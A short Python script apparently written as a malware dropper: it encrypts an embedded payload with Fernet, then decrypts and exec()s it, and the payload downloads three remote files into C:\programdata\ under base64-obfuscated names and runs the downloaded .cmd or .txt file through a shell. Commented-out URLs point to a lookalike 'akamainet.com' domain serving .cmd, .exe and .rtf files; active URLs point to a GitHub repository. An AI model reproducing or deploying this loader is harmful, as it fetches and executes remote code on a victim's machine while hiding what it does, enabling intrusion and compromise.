from cryptography.fernet import Fernet
import base64

def base(string):
    return base64.b64encode(bytes(string,'utf-8'))

# url1 = "https://akamainet.com/update/MonitoringCacheLog.cmd"
# url2 = "https://akamainet.com/update/MonitoringCache.exe"
# url3 = "https://akamainet.com/update/Service.SchCache.rtf"

url1 = "https://github.com/shamemask/Python/blob/main/junior/i.xml"
url2 = "https://github.com/shamemask/Python/blob/main/junior/i.xml"
url3 = "https://github.com/shamemask/Python/blob/main/junior/games.txt"
url = []
url.append(url1)
url.append(url2)
url.append(url3)
cmd = ""
filename=[]
file = []
for ur in url:
    print(ur)
    filename.append(base(ur.split('/')[-1]))
    file.append(base("C:\\programdata\\"+ur.split('/')[-1]))
    if ur.split('/')[-1].split('.')[-1] == 'cmd' or ur.split('/')[-1].split('.')[-1] == 'txt':
        cmd = base("C:\\programdata\\"+ur.split('/')[-1])
code = b"""

import subprocess
import urllib.request
import os
import traceback
import socket
import subprocess
import os







def start(cmd):
    subprocess.call(base64.b64decode(cmd).decode('utf-8'), shell=True)
    


def download(url):
    for i in range(3):
        print(url[i])
        
        
        urllib.request.urlretrieve(url[i], base64.b64decode(filename[i]).decode('utf-8'))
        
        print(base64.b64decode(filename[i]).decode('utf-8'), "download")
        os.replace(base64.b64decode(filename[i]).decode('utf-8'), base64.b64decode(file[i]).decode('utf-8'))
        
    start(cmd)


download(url)


"""

key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)

decrypted_message = encryption_type.decrypt(encrypted_message)

exec(decrypted_message)
